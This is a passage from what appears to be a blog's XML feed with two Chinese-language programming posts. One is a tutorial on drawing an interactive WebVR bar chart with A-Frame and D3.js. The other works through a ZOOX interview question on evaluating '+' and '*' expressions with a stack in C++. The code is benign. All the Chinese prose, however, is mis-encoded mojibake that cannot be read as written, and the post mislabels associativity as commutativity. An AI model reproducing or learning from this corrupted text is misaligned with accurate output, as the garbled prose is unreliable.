é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web component,js,html</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 å·¥ä½œåŠ - WebVR èˆ‡è³‡æ–™è¦–è¦ºåŒ–</title>
    <url>/2017/09/23/webvr-d3/</url>
    <content><![CDATA[å‰è¨€Q2 çš„æ™‚å€™ç¨å¾®ç©äº†ä¸€ä¸‹ WebVRï¼Œä¸»è¦æ˜¯ç­è§£äº† Mozilla ä¸»å°æ¨å‡ºçš„ A-Frameï¼Œé©šè¨æ–¼å…¶ç°¡å–®æ–¹ä¾¿çš„ API è¨­è¨ˆå¤–ï¼Œä¹Ÿä¸€ç›´åœ¨æƒ³é‚„èƒ½åšä»€éº¼æœ‰è¶£çš„æ‡‰ç”¨ï¼Œç›´åˆ°æœ€è¿‘åœ¨æ§‹æ€ D3 çš„ä¸€äº›ç¯„ä¾‹æ™‚ï¼Œæ‰çªç„¶åˆå†æƒ³èµ· WebVRï¼šæ—¢ç„¶ A-Frame æä¾›äº†ä¸€ç³»åˆ—çš„ VR DOM objectï¼Œè€Œ D3.js åˆèƒ½æ“ä½œ DOMï¼Œé‚£ç†è«–ä¸Šä¸€èµ·ä½¿ç”¨æ˜¯æ²’æœ‰å•é¡Œçš„ã€‚
æœä¸å…¶ç„¶ï¼Œç¨ç¨åœ¨ç¶²è·¯æœå°‹ä¸€ä¸‹å°±çœ‹åˆ° WSJ çš„é€™ç¯‡ Is the Nasdaq in Another Bubble?
è¶…é…·çš„å‘€ï¼Œè¦–è¦ºåŒ–è‚¡ç¥¨æ­·å²è³‡æ–™ï¼Œåšæˆé›²éœ„é£›è»Šèˆ¬çš„é–±è®€é«”é©—ï¼Œé›–ç„¶æˆ‘å€‹äººè¦ºå¾—è³‡æ–™è¦–è¦ºåŒ–æ‡‰è©²è¦ä»¥å®è§€è§’åº¦ä¾†è®“ä»–äººæ¸…æ¥šäº†è§£æ•´å€‹è„ˆçµ¡ï¼ŒVR çš„ã€Œå€‹äººã€è¦–è§’ï¼Œé™åˆ¶äº†é€™éƒ¨åˆ†çš„ç‰¹æ€§ï¼Œä½†è‹¥ä»¥ Story telling çš„è§’åº¦ä¾†çœ‹ï¼ŒVR åŠ ä¸Šæ•¸æ“šè¦–è¦ºåŒ–åå€’ç‚ºä½¿ç”¨è€…å¸¶ä¾†æ›´è±å¯Œç”Ÿå‹•çš„é–±è®€ç¶“é©—ï¼Œä¸åƒ…åƒ…æ˜¯ç­è§£å…§å®¹ï¼Œéç¨‹æœ‰è¶£æ‰èƒ½åœ¨ç¢ç‰‡è³‡è¨Šçˆ†ç‚¸çš„æ™‚ä»£æŠ“ä½äººå€‘çš„çœ¼çƒï¼
åœ¨é€™å€‹æƒ³æ³•ä¸‹å°±æ±ºå®šä¾†å˜—è©¦çœ‹çœ‹ç”¨ A-Frame èˆ‡ D3 ä¾†è£½ä½œè³‡æ–™è¦–è¦ºåŒ–ï¼Œé›–ç„¶é‚„æ²’è¾¦æ³•åšå‡ºå¤ªçµ¢éº—çš„äº’å‹•é«”é©—ï¼Œä½†å‡ºç™¼ç¸½è¦æœ‰å€‹é–‹å§‹ï¼Œå°±å…ˆè©¦è©¦æœ€ç°¡å–®çš„ Bar Chart å§ï¼
æœ€å¾Œæœƒé•·é€™æ¨£ï¼š

å‰ç½®ä½œæ¥­æœ‰æ‘¸é A-Frame çš„è®€è€…æ‡‰è©²å¾ˆæ¸…æ¥šè¦å»ºç«‹å‡ºä¸€å€‹ VR å ´æ™¯æœ‰å¤šç°¡å–®ï¼šæ²’æ‘¸éçš„ä¹Ÿæ­¡è¿å›å»çœ‹é€™ç¯‡ WebVR 101
See the Pen WebVR-D3-I by Arvin (@arvin0731) on CodePen.


åŠ å…¥ D3å›æƒ³ä¸€ä¸‹ï¼Œä¸€èˆ¬åœ¨ä½¿ç”¨ D3 çš„æ™‚å€™ï¼Œå°±æ˜¯é¸å–å‡ºä½ è¦æ“ä½œçš„ svg å…ƒä»¶ï¼Œæ¥è‘—å°‡é€²å…¥ enter() ç‹€æ…‹çš„è³‡æ–™ append ä¸Šå»ï¼Œç„¶å¾Œèª¿æ•´ Style èˆ‡ attributesã€‚
é‚£åœ¨ A-Frame ç•¶ä¸­æˆ‘å€‘ä¹Ÿå¯ä»¥å¦‚æ³•æ³¡è£½ï¼š
// å°±åƒæ˜¯ä»¥å‰é¸å– svg ä¸€æ¨£ï¼Œåªæ˜¯åœ¨ VR ä¸­æˆ‘å€‘è¦é¸å– a-sceneconst scene = d3.select(&#x27;a-scene&#x27;);// è™•ç†è³‡æ–™èˆ‡ DOM å…ƒç´ çš„æ–¹å¼èˆ‡å¹³æ™‚æ“ä½œ d3 ç›¸åŒï¼Œä¸€æ¨£çš„ enter/update/exit ç‹€æ…‹const bars = scene.selectAll(&#x27;a-box.bar&#x27;).data(data);// çœŸæ­£ append è³‡æ–™ä¸¦è¨­å®šå±¬æ€§bars.enter().append(&#x27;a-box&#x27;).classed(&#x27;bar&#x27;, true)  .attr(&#x27;position&#x27;, (d, i) =&gt; &#123;  const x =  i * 0.8 - (data.length / 2);  const y = hscale(d)/2;  const z = -3  return x + &quot; &quot; + y + &quot; &quot; + z   &#125;)  .attr(&#x27;width&#x27;, (d) =&gt; 0.5)  .attr(&#x27;depth&#x27;, (d) =&gt; 0.5)  // hscale å°±åªæ˜¯å€‹ d3 çš„ scaleLinear æ˜ å°„å‡½æ•¸  .attr(&#x27;height&#x27;, (d) =&gt; hscale(d))  .attr(&#x27;opacity&#x27;, alpha)  .attr(&#x27;color&#x27;, &#x27;blue&#x27;);

é¦–å…ˆæˆ‘å€‘ select å‡º a-sceneï¼Œæ¥è‘—åœ¨å…¶ä¸‹é¢é å…ˆå°‡è³‡æ–™ binding åˆ°æ“æœ‰ bar é€™å€‹ classname çš„ a-box entity å…§ï¼ˆæ­¤æ™‚é‚„æ˜¯è™›æ“¬çš„ DOM ç‰©ä»¶ï¼‰ï¼Œæœ€å¾Œå†å‘¼å« enter() ä¾†çœŸæ­£çš„å°‡è³‡æ–™ append åˆ° DOM ä¸Šé¢ã€‚
é€™é‚Šæœ‰å…©å€‹å°åœ°æ–¹éœ€è¦æ³¨æ„ï¼š

é™¤äº†å¯¬ï¼ˆwidthï¼‰èˆ‡é«˜ï¼ˆheightï¼‰å¤–ï¼Œé‚„æœ‰æ·±åº¦ï¼ˆdepthï¼‰éœ€è¦è¨­å®šï¼Œç•¢ç«Ÿç¾åœ¨æ˜¯åœ¨ 3D çš„ä¸–ç•Œä¸­ã€‚
æ•¸å€¼çš„è¨­å®šï¼šåœ¨ WebVR API ä¸­ï¼Œå›å‚³çš„è·é›¢è³‡æ–™ä»¥ Meter ç‚ºå–®ä½ï¼Œå› æ­¤åœ¨ A-frame ä¸­çš„è·é›¢å–®ä½ä¹Ÿæ˜¯ Meterï¼Œä¸¦éä¸€èˆ¬é é¢çš„ pixelï¼Œå› æ­¤æˆ‘å€‘çš„ x, y, z å€¼è¨˜å¾—ä¸èƒ½è¨­å®šå¤ªå¤§ã€‚

çµæœå¦‚ä¸‹ï¼š
See the Pen WebVR-D3-II by Arvin (@arvin0731) on CodePen.


ç°¡å–®å¹¾è¡Œ code å°±èƒ½å¤ åœ¨ VR çš„ä¸–ç•Œå…§å‘ˆç¾è³‡æ–™åœ–è¡¨å›‰ï¼
äº’å‹•å…ƒç´ å¹³é¢çš„ D3 èƒ½å¤ äº’å‹•ï¼ŒVR ç‰ˆç•¶ç„¶ä¹Ÿè¦ã€‚
åœ¨ VR è£¡é¢çš„ Cursor åŸºæœ¬ä¸Šæ˜¯è·Ÿè‘—ä½ çš„æ”å½±æ©Ÿï¼ˆcameraï¼‰ï¼Œä½ å¯ä»¥ç›´æ¥ç”¨ A-Frame æä¾›çš„ entityï¼Œå°±å¯ä»¥æœ‰åŸºæœ¬çš„ gaze-based cursorï¼ˆå‡è¦–å‹ï¼‰ï¼Œé¡§åæ€ç¾©ï¼Œä¹Ÿå°±æ˜¯ä»¥ä½ çš„è¦–ç·šç‚ºä¸­å¿ƒçš„ cursorï¼Œä¸¦ä¸”å¯ä»¥è§¸ç™¼ mouseenter, mouseleave ç­‰äº‹ä»¶:
&lt;a-camera&gt;    &lt;a-cursor&gt;&lt;/a-cursor&gt;&lt;/a-camera&gt;

æˆ–æ˜¯è‡ªå·± create ä¸€å€‹ cursor entityï¼šsource
&lt;a-entity position=&quot;0 1 0&quot; rotation=&quot;0 0 0&quot;&gt;    &lt;a-entity camera look-controls wasd-controls&gt;        &lt;a-entity cursor=&quot;fuse: true; fuseTimeout: 500&quot;                position=&quot;0 0 -2&quot;                geometry=&quot;primitive: ring; radiusInner: 0.02; radiusOuter: 0.027&quot;                material=&quot;color: black; shader: flat&quot;&gt;        &lt;/a-entity&gt;    &lt;/a-entity&gt;&lt;/a-entity&gt;

è¦æ³¨æ„çš„æ˜¯ï¼Œç”±æ–¼æˆ‘å€‘éœ€è¦è¨­å®š cursor èˆ‡ camera çš„ä½ç½®ï¼Œæ‰€ä»¥å°‡é€™å…©å€‹ entity éƒ½åŒ…åœ¨å¦ä¸€å€‹ entity ä¸‹ï¼Œä¸¦ç”±æœ€ä¸Šå±¤çš„ entity ä¾†è¨­å®šåˆå§‹ position æœƒè¼ƒç‚ºæ–¹ä¾¿ã€‚
è€Œåœ¨ cursor é€™å€‹ entity ä¸Šæˆ‘å€‘è¨­å®šäº†å¹¾å€‹å±¬æ€§ï¼š

cursorï¼šè¨­å®šç‚º fuse: trueï¼Œå³ä»£è¡¨ gaze-based cursorï¼Œæœƒè·Ÿè‘—ä½ è¦–ç·šç§»å‹•ï¼Œä¸¦ä¸”ç•¶ä½ ã€Œç›¯è‘—ã€æŸå€‹é»ä¸€æ®µæ™‚é–“ï¼ˆfuseTimeoutï¼‰å¾Œï¼Œæœƒè§¸ç™¼ Click eventã€‚
materialï¼šå¯ä»¥è¨­å®šå…¶é¡è‰²æè³ªã€‚
geometryï¼šè¨­å®šå…¶ç‰©ç†å½¢ç‹€ã€‚

ç•¶ç„¶å¦‚æœä½ æ˜¯ç”¨ Vive, daydream çš„ controllerï¼Œä¹Ÿå·²æœ‰å…¶ç›¸å°æ‡‰çš„ entity å¯ä»¥ä½¿ç”¨ï¼Œå¯ä»¥åƒè€ƒé€™ä»½æ–‡ä»¶ (laser-controls)[https://aframe.io/docs/0.7.0/components/laser-controls.html]
è¨­å®šå¥½ cursor å¾Œï¼Œæ¥è‘—å°±æ˜¯åœ¨æˆ‘å€‘çš„ bar ä¸Šé¢è¨­ç½® event listener äº†ã€‚
åœ¨å‰›å‰›çš„ attr å¾Œé¢å†æ¥è‘—åˆ©ç”¨ on ä¾†è¨­å®š listenerï¼š
bars.enter().append(&#x27;a-box&#x27;).classed(&#x27;bar&#x27;, true)    .attr(&#x27;position&#x27;, (d, i) =&gt; &#123;        const x =  i * 0.8 - (data.length / 2);        const y = hscale(d)/2;        const z = -3;        return x + &quot; &quot; + y + &quot; &quot; + z;    &#125;)    .attr(&#x27;width&#x27;, (d) =&gt; 0.5)    .attr(&#x27;depth&#x27;, (d) =&gt; 0.5)    .attr(&#x27;height&#x27;, (d) =&gt; hscale(d))    .attr(&#x27;opacity&#x27;, alpha)    .attr(&#x27;color&#x27;, &#x27;blue&#x27;)    .on(&quot;mouseenter&quot;, function(d,i) &#123;        d3.select(this).transition().duration(10)        .attr(&#x27;opacity&#x27;, 0.9);        d3.select(this).append(&quot;a-text&quot;)        .attr(&#x27;color&#x27;, &#x27;red&#x27;)        .attr(&#x27;align&#x27;, &#x27;center&#x27;)        .attr(&#x27;position&#x27;, `0 $&#123;(hscale(d) / 2 + 0.5)&#125; 0`)        .attr(&#x27;scale&#x27;, &#x27;1 1 1&#x27;)        .attr(&#x27;value&#x27;, `$&#123;dataText[i]&#125;, $&#123;d&#125;`);    &#125;)    .on(&quot;mouseleave&quot;, function(d,i) &#123;        d3.select(this).transition().duration(500)        .attr(&#x27;opacity&#x27;, alpha);        d3.select(this).select(&quot;a-text&quot;).remove();    &#125;)

ä¸Šé¢åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œåœ¨ mouseenter æ™‚ï¼Œæˆ‘å€‘ append ä¸Šä¸€å€‹ &lt;a-text&gt;ï¼Œä¸¦è¨­å®šé¡è‰²ä½ç½®ç­‰ç­‰ï¼Œç„¶å¾Œå¥—ç”¨ä¸€å€‹ transition å‹•ç•«ä¾†æ”¹è®Š bar çš„é¡è‰²ï¼Œmouseleave æ™‚æŠŠ style é‚„åŸã€‚
å¦‚æ­¤ä¸€ä¾†ä½ å°±æœ‰äº†ä¸€å€‹å¯ä»¥äº’å‹•çš„ VR bar chart äº†ï¼
See the Pen WebVR-D3-II by Arvin (@arvin0731) on CodePen.


Component åŒ–æˆ‘åšåˆ°é€™é‚Šçš„æ™‚å€™çªç„¶æœ‰å€‹æƒ³æ³•ï¼Œæ—¢ç„¶ A-frame å¯ä»¥è®“æˆ‘å€‘è‡ªå·±å®¢è£½åŒ– Entity å…§è¦æ”¾çš„ componentï¼Œé‚£æˆ‘å€‘èƒ½ä¸èƒ½å°‡å‰›å‰›çš„ code å…¨éƒ¨å¡é€² component å…§å‘¢ï¼Ÿ
é‚„è¨˜å¾—åœ¨ WebVR 101 ä¸­æœ‰è¨˜éŒ„åˆ°æˆ‘å€‘å¯ä»¥é€é AFRAME é€™å€‹å…¨åŸŸè®Šæ•¸ä¾†è¨»å†Š componentï¼Œä¸¦æ”¾å…¥ &lt;a-entity&gt; ä¸­ï¼šreference
barchart.jsAFRAME.registerComponent(&#x27;barchart&#x27;, &#123;    schema: &#123;        json: &#123;            default: &#123;                    key: [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;],                    value: [19, 80, 30, 15, 55]                &#125;            &#125;    &#125;,    init: function () &#123;        this.generate();    &#125;,    generate: function () &#123;        const json = this.data.json;        const el = this.el;        // default alpha for bars        const alpha = 0.6;        const data = json.value;        const dataText = json.key;        // Select the current enity object just like an svg        const currentEntity = d3.select(el);        // we use d3&#x27;s enter/update/exit pattern to draw and bind our dom elements        const bars = currentEntity.selectAll(&#x27;a-box.bar&#x27;).data(data);        /*        ...         é€™é‚Šæ”¾å…¥ä¸Šé¢æ‰€æ’°å¯«çš„ D3 ç›¸é—œçš„ç¨‹å¼ç¢¼        */    &#125;    &#125;);


schema: é€™é‚Šæ˜¯ç”¨ä¾†è¨­å®šæ­¤ entity çš„ propertiesï¼Œåƒæ˜¯èƒ½é€éè¨­ç½® json å±¬æ€§ä¾†å‚³å…¥è³‡æ–™ &lt;a-entity barchart=&quot;json: data.json&quot;&gt;&lt;/a-entity&gt;ã€‚åŒæ™‚ä½ ä¹Ÿå¯ä»¥åœ¨é€™é‚Šè¨­å®š default çš„å±¬æ€§å€¼ã€‚

init: Component åœ¨åˆå§‹éšæ®µæœƒå‘¼å«æ­¤å‡½æ•¸ä¸€æ¬¡ï¼Œç”¨ä¾†åˆå§‹è®Šæ•¸æˆ–æ˜¯ component çš„ç‹€æ…‹ï¼Œä»¥æˆ‘å€‘é€™é‚Šçš„ä¾‹å­å°±æ˜¯ç”¨ä¾†å‘¼å« d3 ç¹ªè£½åœ–è¡¨ã€‚  ï¼ˆComponent é‚„æœ‰è¨±å¤š lifecycleï¼šupdate, remove, tick, play, pause, updateSchemaï¼Œå¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼‰

generate: é€™é‚Šå°±æ˜¯æˆ‘å€‘ç”¨ä¾†è™•ç† D3 åœ–è¡¨çš„å‡½å¼ã€‚


åœ¨é€™é‚Šæ¯”è¼ƒéœ€è¦äº†è§£çš„æ˜¯ schema property èˆ‡ Component æœ¬èº«çš„ HTML Element çš„å­˜å–æ–¹å¼ï¼šæˆ‘å€‘åœ¨ schema ä¸­å®šç¾©çš„å±¬æ€§éƒ½æœƒå­˜åœ¨æ–¼ this.data ä¸­ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥é€é this.data.json ä¾†å–å¾— json å±¬æ€§çš„è³‡æ–™ï¼›è€Œ this.el å‰‡æ˜¯å›å‚³ Component æœ¬èº«çš„ HTML Elementï¼Œæˆ‘å€‘è¦ç”¨ä¾†çµ¦ D3 é€²è¡Œ DOM object æ“ä½œçš„ã€‚
ç•¶ä½ è¨»å†Šå¥½ component å¾Œï¼Œåœ¨æˆ‘å€‘çš„ HTML ä¸­å°±åªéœ€è¦æ”¾ç½® &lt;a-entity barchart&gt;&lt;/a-entity&gt; å°±å¯ä»¥ç”¢ç”Ÿåœ–è¡¨äº†ï¼
ï¼ˆå”¯ä¸€è¦æ³¨æ„çš„æ˜¯ï¼Œä½ çš„ component ä¸€å®šè¦åœ¨ &lt;a-sene&gt; render ä¹‹å‰å°±è™•ç†å¥½ï¼Œæœ€å¥½æ˜¯æ”¾åœ¨ &lt;head&gt; çš„ä½ç½®ã€‚
ä½ ä¹‹å¾Œåªè¦å°‡å‰›å‰›å‰µå»ºçš„ component export å‡ºå»ï¼Œå°±å¯ä»¥è®“ä»»ä½•äººé€é &lt;a-entity barchart&gt;&lt;/a-entity&gt; çš„æ–¹å¼ä¾†ä½¿ç”¨ã€‚è€Œä¸”é€é property çš„è¨­å®šï¼Œæˆ‘å€‘å¯ä»¥å‚³å…¥ä¸åŒè³‡æ–™ï¼Œç”šè‡³æ˜¯é¡è‰²è¨­å®šç­‰ç­‰çš„å±¬æ€§ï¼Œä¾†é€²è¡Œå®¢è£½åŒ–çš„åœ–è¡¨ï¼
åƒæ˜¯å¯ä»¥ç”¢ç”Ÿä¸€å€‹ 104 å¹´å°ç£å¹´é½¡äººå£æ•¸çµ±è¨ˆé•·æ¢åœ–ï¼š
åªè¦åœ¨ html ä¸­åŠ å…¥&lt;a-entity barchart=&quot;json: https://cdn.rawgit.com/ArvinH/f47671a9ff33b6719b043945d36054ac/raw/09a6ea23ee40d4a83205eef6d4fd4e5efa072c2b/104life.json&quot;&gt;&lt;/a-entity&gt; 
ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ component å…§çš„ init å‡½æ•¸ï¼Œå› ç‚ºå¾ entity å‚³ä¾†çš„ property é è¨­æœƒæ˜¯ string çš„ typeï¼š
init: function () &#123;    var self = this;    if (typeof this.data.json === &#x27;string&#x27;) &#123;        fetch(this.data.json)        .then(function(response) &#123;            return response.json();        &#125;).then(function(parsedJson) &#123;            self.generate(parsedJson || this.data.json); // fallback to default        &#125;).catch(function(ex) &#123;            console.log(&#x27;parsing failed&#x27;, ex)        &#125;)    &#125;&#125;,

é †ä¾¿åŠ å…¥ä¸€äº› color çš„è™•ç†ï¼Œæˆæœå¦‚ä¸‹ï¼š
See the Pen WebVR-D3-IV by Arvin (@arvin0731) on CodePen.



çµè«–é›–ç„¶åªæ˜¯ç°¡å–®çš„å¯¦ä½œä¸€å€‹ Barchartï¼Œä½†é€éé€™æ¬¡çš„å°å˜—è©¦ï¼Œå¤§æ¦‚äº†è§£è©²æ€éº¼æ¨£ç”¨ D3 èˆ‡ A-Frame å¯«å‡ºä¸€å€‹ WebVR Data visulization Component å¾Œï¼Œå°±å¯ä»¥æœ‰è¨±å¤šæ±è¥¿å¯ä»¥ç©äº†ï¼æˆ–è¨±å¯ä»¥çµåˆç¾æœ‰çš„ 3D modalï¼Œä¸¦å°‡é–‹æ”¾è³‡æ–™ç”¨ä¸åŒçš„æ¨¡å‹å‘ˆç¾ï¼Œè£½ä½œå‡ºä¸€å€‹ 3D VR ç‰ˆçš„åŸå¸‚åœ–è¡¨ï¼Œæ‡‰è©²æœƒå¾ˆæœ‰è¶£ï¼åŠ ä¸Šä»–åŒ…è£¹æˆ Component çš„æ–¹å¼éå¸¸æ–¹ä¾¿ï¼Œåœ¨ç¤¾ç¾¤çš„åŠªåŠ›ä¸‹ï¼Œå¯¦ä½œä¸Šå‹¢å¿…æœƒæ›´åŠ è¼•é¬†ï¼ˆgithub ä¸Šå·²ç¶“æœ‰è¨±å¤šäººé‡‹å‡ºçš„ component å¯ä»¥ä½¿ç”¨ï¼‰ã€‚
é è¨ˆä¸‹ä¸€ç¯‡æœƒå†ä¾†åšå€‹æœ‰è¶£ä¸¦è¤‡é›œä¸€é»çš„ VR è³‡è¨Šåœ–è¡¨ï¼
è³‡æ–™ä¾†æº
A-Frame doc
kframe
aframe + d3 test
WebVR 101
Is the Nasdaq in Another Bubble?

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>webvr, A-frame, d3</tag>
      </tags>
  </entry>
  <entry>
    <title>ZOOX è‡ªå‹•é§•é§›å…¬å¸é¢è©¦é¡Œç›®</title>
    <url>/2019/07/05/zooz-2018-oa/</url>
    <content><![CDATA[å‰è¨€ZOOX æ˜¯ä¸€é–“åšè‡ªå‹•é§•é§›çš„æ–°å‰µå…¬å¸ï¼Œä»Šå¤©å°±ä¾†è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹ä»–å€‘å¸¸å‡ºçš„ OAï¼ˆOnline Assessmentï¼‰é¡Œç›®è·Ÿè§£æ³•ï¼ˆç”¨ C++ å¯¦ä½œï¼‰ã€‚é¡Œç›®å‡ºè‡ªä¸€ç•ä¸‰åˆ†åœ°è«–å£‡çš„åˆ†äº«ã€‚
é¡Œç›®ä¸€ - Arithmetic expression evaluationé¡Œç›®æ•˜è¿°Write a program that takes a single line of input,representing an arithmetic expression.The expression will consist of numeric digits (0-9),the plus operator (+) and the multiplication operator (*).The given expression will be a valid arithmetic expression(ie. &quot;*2++&quot; is not valid).Your task is to evaluate the arithmetic expression,following the normal rules of operator precedence,and print the result without any leading or trailing whitespace.The resulting numbers will fit in a normal integer.Example Input20+2*3Example Output26

é¡Œæ„ç†è§£èˆ‡é€£çµé€™é¡ŒåŸºæœ¬ä¸Šå°±æ˜¯è¦å¯«ä¸€å€‹åŸºç¤ç‰ˆçš„è¨ˆç®—æ©Ÿ(åªæœ‰ 0-9, +, *)ï¼Œå°æ‡‰åˆ°çš„ leetcode é¡Œç›®æ˜¯ï¼š 227 - Basic Calculator IIã€‚
è§£æ³•è¦æ€è€ƒé€™å€‹é¡Œç›®ï¼Œæœ€é—œéµçš„åœ°æ–¹åœ¨æ–¼æˆ‘å€‘éœ€è¦è™•ç†çš„ operator - â€˜+â€™ è·Ÿ â€˜*â€˜ï¼Œé€™å…©å€‹ operator æœ‰ä¸€äº›æ€§è³ªï¼š

+ è·Ÿ * éƒ½ç¬¦åˆäº¤æ›å¾‹ï¼ŒA+B+C &#x3D; (A+B)+C &#x3D; A+(B+C)ï¼ŒA*B*C &#x3D; (A*B)*C &#x3D; A*(B*C)ã€‚

* è¦æ¯” + å…ˆè¢«è¨ˆç®—ï¼Œä¸ç„¶æœƒå¾—åˆ°éŒ¯çš„çµæœã€‚


å…¶ä¸­ 2 æ˜¯æˆ‘å€‘è¦æ¯”è¼ƒæ³¨æ„çš„ï¼Œä»¥é«˜éšçš„æ¦‚å¿µä¾†æ€è€ƒï¼š

è¦å˜›å°±æ˜¯å…ˆè™•ç†æ‰æ‰€æœ‰ * çš„é‹ç®—ï¼Œæœ€å¾Œå°±åªå‰© +ï¼Œé‚£å°±æŠŠå‰©ä¸‹çš„æ‰€æœ‰æ•¸å­—åŠ ç¸½å°±å¥½
ä¸ç„¶å°±æ˜¯è¦èƒ½å¤ åœ¨é‡åˆ° * çš„æ™‚å€™ï¼ŒæŠŠ * å‰é¢çš„æ•¸å­—å†æ‹¿å‡ºä¾†ï¼Œè·Ÿ * å¾Œé¢çš„æ•¸å­—ç›¸ä¹˜å®Œï¼Œç„¶å¾ŒåŠ å›å»

è€Œå¦‚æœè¦å¯¦ä½œæˆç¨‹å¼ï¼Œ2 çš„åšæ³•æ˜¯æ¯”è¼ƒå®¹æ˜“çš„(å› ç‚ºæˆ‘å€‘å¯ä»¥é †è‘— input çš„æ–¹å‘ iterate é input ä¸€æ¬¡å°±å¥½)ï¼Œæ¯”å¦‚èªª 20+2*3ï¼Œå¦‚æœæˆ‘å€‘å¯ä»¥å…ˆç”¨ä¸€å€‹è³‡æ–™çµæ§‹å­˜ [20, 2]ï¼Œé‚£ç•¶æˆ‘å€‘é‡åˆ° 3 çš„æ™‚å€™ï¼Œæˆ‘å€‘å°±å¯ä»¥æŠŠ 2 å¾è³‡æ–™çµæ§‹ä¸­æ‹¿å‡ºä¾†ï¼Œè·Ÿ 3 ç›¸ä¹˜ä¹‹å¾Œå†æ”¾é€²è³‡æ–™çµæ§‹ï¼Œè®Šæˆå­˜ [20, 6]ã€‚
é€™æ¨£åšçš„å¥½è™•æ˜¯æ„Ÿè¦ºå¯ä»¥æ“´å±•ï¼Œä¾‹å¦‚ 20+2*3*5ï¼Œé‡åˆ° 5 çš„æ™‚å€™ï¼Œå°±å¾ [20, 6] æ‹¿å‡º 6ï¼Œè·Ÿ 5 ç›¸ä¹˜å®Œå†æ”¾å›è³‡æ–™çµæ§‹ï¼Œè³‡æ–™çµæ§‹è£¡é¢å­˜çš„æ±è¥¿å°±è®Šæˆ [20, 30]ã€‚ç„¶å¾Œæœ€å¾Œå†æŠŠè³‡æ–™çµæ§‹ä¸­çš„çš„æ‰€æœ‰æ•¸å­—åŠ ç¸½å°±å¥½ã€‚
æ‰€ä»¥åˆ°ç›®å‰ç‚ºæ­¢ï¼Œæˆ‘å€‘æƒ³å‡ºäº†ä¸€å€‹å¯èƒ½çš„æ¼”ç®—æ³•ï¼š

å¦‚æœé‡åˆ°æ•¸å­—ï¼Œå°±å…ˆè¨ˆç®—é€™å€‹æ•¸å­—çš„å€¼ï¼ˆè¦è¨˜ä½æˆ‘å€‘ç¾åœ¨çš„ input æ˜¯å­—ä¸²ï¼Œæ‰€ä»¥éœ€è¦æŠŠæ•¸å­—çš„éƒ¨åˆ†è™•ç†å®Œæ‰èƒ½å¾—åˆ° intï¼‰
å¦‚æœæ•¸å­—å‰é¢çš„ operator æ˜¯ +ï¼Œå°±å…ˆæŠŠç›®å‰çš„æ•¸å­—æ”¾é€²è³‡æ–™çµæ§‹
å¦‚æœæ•¸å­—å‰é¢çš„ operator æ˜¯ *ï¼Œå°±æŠŠè³‡æ–™çµæ§‹ä¸­æœ€æ™šæ”¾é€²å»çš„æ•¸å­—æ‹¿å‡ºä¾†ï¼Œè·Ÿç¾åœ¨çš„æ•¸å­—ç›¸ä¹˜å®Œï¼Œå†æ”¾é€²è³‡æ–™çµæ§‹
è™•ç†å®Œå­—ä¸²ï¼ŒåŠ ç¸½è³‡æ–™çµæ§‹ä¸­æ‰€æœ‰æ•¸å­—

çœ‹åˆ°é€™é‚Šï¼Œæˆ‘å€‘æœƒç™¼ç¾é€™å€‹è³‡æ–™çµæ§‹ä¸»è¦å¾—æœ‰å…©å€‹åŠŸèƒ½ï¼š

è¨˜éŒ„æ‰€æœ‰çš„æ•¸å­—
èƒ½å¤ åå‡ºæœ€å¾Œæ”¾é€²å»çš„æ•¸å­—

é‚£é¡¯ç„¶å°±æ˜¯ä¸€å€‹ stackã€‚
æŠŠä»¥ä¸Šçš„æƒ³æ³•å¯«æˆç¨‹å¼ç¢¼ï¼Œå°±å¯ä»¥å¯¦ä½œå‡ºä¸‹é¢çš„ code å›‰ï¼š
class Solution &#123;public:  int calculate(string s) &#123;    // å¦‚æœå­—ä¸²è£¡æ²’æ±è¥¿ï¼Œé‚£ç­”æ¡ˆå°±æ˜¯ 0    int len = s.length();    if(len == 0) return 0;    stack&lt;int&gt; st;    int num = 0;    char sign = &#x27;+&#x27;;        for(int i=0; i&lt;len; i++)&#123;      // å¦‚æœé‡åˆ°æ•¸å­—ï¼Œå°±å…ˆè¨ˆç®—é€™å€‹æ•¸å­—çš„å€¼      if(isdigit(s[i]))        num = num*10 + (s[i]-&#x27;0&#x27;);            if((!isdigit(s[i]) &amp;&amp; &#x27; &#x27; != s[i]) || i==len-1)&#123;        // å¦‚æœæ•¸å­—å‰é¢çš„ operator æ˜¯ +ï¼Œå°±å…ˆæŠŠç›®å‰çš„æ•¸å­—æ”¾é€²è³‡æ–™çµæ§‹        if(sign==&#x27;+&#x27;) &#123; st.push(num); &#125;            // å¦‚æœæ•¸å­—å‰é¢çš„ operator æ˜¯ *ï¼Œå°±æŠŠè³‡æ–™çµæ§‹ä¸­æœ€æ™šæ”¾é€²å»çš„æ•¸å­—æ‹¿å‡ºä¾†        // è·Ÿç¾åœ¨çš„æ•¸å­—ç›¸ä¹˜å®Œï¼Œå†æ”¾é€²è³‡æ–™çµæ§‹        if(sign==&#x27;*&#x27;) &#123; int t = st.top()*num; st.pop(); st.push(t); &#125;                sign = s[i];        num = 0;      &#125;    &#125;    // è™•ç†å®Œå­—ä¸²ï¼ŒåŠ ç¸½è³‡æ–™çµæ§‹ä¸­æ‰€æœ‰æ•¸å­—    int res = 0;    while (!st.empty()) &#123;      res += st.top();      st.pop();    &#125;    return res;  &#125;&#125;;

å¦‚æœæœ‰èˆˆè¶£æ¢è¨æ›´å¤š calculator ç›¸é—œå•é¡Œçš„è©±ï¼Œå¯ä»¥æŠŠ Leetcode ä¸Šçš„ Basic Calculator ç³»åˆ—éƒ½åšä¸€åšï¼Œç„¶å¾Œå¯ä»¥åƒè€ƒé€™ç¯‡è¨è«– - Development of a generic solution for the series of the calculator problemsã€‚
